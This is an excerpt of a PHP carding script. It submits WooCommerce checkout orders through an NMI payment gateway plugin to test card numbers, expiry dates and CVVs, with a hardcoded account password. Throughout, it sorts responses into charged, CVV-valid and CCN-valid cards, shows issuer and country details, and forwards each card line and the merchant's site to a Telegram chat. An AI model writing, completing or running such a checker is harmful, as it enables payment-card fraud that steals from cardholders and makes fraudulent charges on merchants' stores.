...
# ---------------- [ WC AJAX ] --------- #
$paymentMethods = [
    // 'WOO-NMI-PAYMENT-GATEWAY_gateway_woocommerce_credit_card' => '/<input[^>]*name="payment_method"[^>]*value="WOO-NMI-PAYMENT-GATEWAY_gateway_woocommerce_credit_card"/',
    'woo-WOO-NMI-PAYMENT-GATEWAY-payment-gateway' => '/<input[^>]*name="payment_method"[^>]*value="woo-WOO-NMI-PAYMENT-GATEWAY-payment-gateway"/'
];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'billing_phone' => $phone,
    'billing_email' => $email,
    "account_password" => "124n425sd34535643",
    'agent_name' => 'Jason McCormack',
    'shipping_first_name' => '',
    'shipping_last_name' => '',
    'shipping_company' => '',
    'shipping_country' => '',
    ...
    'woo-WOO-NMI-PAYMENT-GATEWAY-card-number' => $cc,
    'woo-WOO-NMI-PAYMENT-GATEWAY-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'woo-WOO-NMI-PAYMENT-GATEWAY-card-cvc' => $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED WOO-NMI-PAYMENT-GATEWAY PAYMENTS GATEWAY]
    \n[$hostname1]
    \n[$receiptUrl]\n";
   ...
   echo '<span style="color: #ffffffff; padding: 8px;"> #CVV [INSUFFICIENT FUNDS] [AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff6b09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
   

          $telegramMessage = "[#CVV]- $lista [CVV WOO-NMI-PAYMENT-GATEWAY PAYMENTS GATEWAY]
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

    } elseif (strpos($Payment, "Transaction Failed. 225-Declined for CVV failure") !== false) { 
    ...
    <span style="color: #b5ff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
   

              $telegramMessage = "[#CCN]- $lista [CCN WOO-NMI-PAYMENT-GATEWAY PAYMENTS GATEWAY]
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
